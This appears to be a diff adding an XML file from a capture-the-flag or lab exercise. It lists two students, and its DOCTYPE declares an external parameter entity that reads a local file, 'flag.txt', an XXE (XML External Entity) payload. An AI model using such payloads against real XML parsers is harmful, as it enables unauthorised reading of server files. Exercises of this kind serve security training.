@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"C:/xampp/htdocs/xxe3/flag.txt"> %xxe;]>
+<students>
+	<student>
+		<name>Hoang</name>
+		<year>1998</year>
+		<school>HUST</school>
+	</student>
+	<student>
+		<name>Pham</name>
+		<year>1997</year>
+		<school>NUCE</school>
+	</student>
+</students>
